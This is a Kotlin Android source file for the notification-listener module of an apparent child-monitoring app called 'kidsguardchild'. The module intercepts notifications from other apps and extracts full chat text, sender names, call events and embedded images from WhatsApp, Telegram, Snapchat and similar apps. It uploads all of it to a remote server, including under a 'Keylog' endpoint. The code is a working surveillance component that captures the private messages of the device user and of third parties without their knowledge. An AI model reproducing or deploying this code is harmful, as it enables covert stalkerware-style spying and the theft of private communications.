package com.example.kidsguardchild.modules

import android.graphics.Bitmap
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Base64
import android.util.Log
import com.example.kidsguardchild.core.ApiClient
import com.example.kidsguardchild.core.AppCallBody
import com.example.kidsguardchild.core.DataUploader
import com.example.kidsguardchild.core.KeylogBody
import com.example.kidsguardchild.core.NotificationBody
import com.example.kidsguardchild.core.SocialChatBody
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream

private const val TAG = "NotificationModule"

class NotificationModule : NotificationListenerService() {

    private val scope = CoroutineScope(Dispatchers.IO)

    override fun onListenerConnected() {
        super.onListenerConnected()
        NotificationSyncBridge.listener = this
        Log.d(TAG, "Notification listener connected")
        syncActiveNotifications()
    }

    override fun onListenerDisconnected() {
        NotificationSyncBridge.listener = null
        super.onListenerDisconnected()
    }

    /** Upload all currently visible notifications (historical snapshot). */
    fun syncActiveNotifications() {
        try {
            activeNotifications?.forEach { onNotificationPosted(it) }
            Log.i(TAG, "Active notification historical sync done")
        } catch (e: Exception) {
            Log.w(TAG, "Historical notification sync failed: ${e.message}")
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val pkg = sbn.packageName ?: return
        if (pkg == applicationContext.packageName) return

        val extras = sbn.notification.extras ?: return
        val title = extras.getCharSequence("android.title")?.toString() ?: "Notification"
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString()
        val fullText = (bigText?.takeIf { it.isNotBlank() } ?: text).ifBlank { title }

        val appName = getAppLabel(pkg)
        val preview = if (fullText.length > 120) fullText.substring(0, 120) + "…" else fullText

        val isCall = fullText.contains("call", ignoreCase = true) ||
            title.contains("call", ignoreCase = true) ||
            fullText.contains("missed", ignoreCase = true)
        val isSocialApp = SOCIAL_PACKAGES.any { pkg.contains(it, ignoreCase = true) }

        val messageType = detectMessageType(fullText, extras)
        val mediaUrl = extractMediaUrl(extras, messageType)

        scope.launch {
            try {
                if (isSocialApp && isCall) {
                    DataUploader.upload("AppCall[$appName]") {
                        ApiClient.service.postAppCall(
                            AppCallBody(
                                name = title,
                                phone = title,
                                app = appName,
                                type = if (fullText.contains("missed", true)) "Missed" else "Incoming",
                                duration = "00:00",
                                status = "Normal"
                            )
                        )
                    }
                } else if (isSocialApp) {
                    DataUploader.upload("SocialChat[$appName]") {
                        ApiClient.service.postSocialChat(
                            SocialChatBody(
                                app = appName,
                                contact = title,
                                preview = preview,
                                fullText = fullText,
                                messageType = messageType,
                                mediaUrl = mediaUrl
                            )
                        )
                    }
                    if (fullText.isNotBlank()) {
                        DataUploader.upload("Keylog[$appName]") {
                            ApiClient.service.postKeylog(KeylogBody(app = appName, text = fullText))
                        }
                    }
                } else {
                    DataUploader.upload("Notification[$appName]") {
                        ApiClient.service.postNotification(
                            NotificationBody(app = appName, title = title, preview = preview)
                        )
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Notification upload skipped: ${e.message}")
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}

    private fun detectMessageType(text: String, extras: android.os.Bundle): String {
        if (extras.containsKey("android.picture")) return "image"
        val lower = text.lowercase()
        return when {
            lower.contains("video") || lower.contains("sent a video") || lower.contains("🎥") -> "video"
            lower.contains("photo") || lower.contains("image") || lower.contains("sent a photo") ||
                lower.contains("picture") || lower.contains("📷") -> "image"
            else -> "text"
        }
    }

    private fun extractMediaUrl(extras: android.os.Bundle, messageType: String): String? {
        if (messageType != "image" && messageType != "video") return null
        val picture = extras.get("android.picture")
        if (picture is Bitmap) {
            return bitmapToDataUrl(picture)
        }
        return null
    }

    private fun bitmapToDataUrl(bitmap: Bitmap): String? {
        return try {
            val scaled = Bitmap.createScaledBitmap(
                bitmap,
                minOf(bitmap.width, 512),
                minOf(bitmap.height, 512),
                true
            )
            val stream = ByteArrayOutputStream()
            scaled.compress(Bitmap.CompressFormat.JPEG, 70, stream)
            val b64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
            "data:image/jpeg;base64,$b64"
        } catch (e: Exception) {
            Log.w(TAG, "Bitmap encode failed: ${e.message}")
            null
        }
    }

    private fun getAppLabel(packageName: String): String {
        return try {
            val pm = applicationContext.packageManager
            val info = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(info).toString()
        } catch (e: Exception) {
            packageName.substringAfterLast(".")
        }
    }

    companion object {
        private val SOCIAL_PACKAGES = listOf(
            "whatsapp", "instagram", "facebook", "messenger", "telegram",
            "snapchat", "tiktok", "discord", "viber", "line", "wechat", "kik"
        )
    }
}
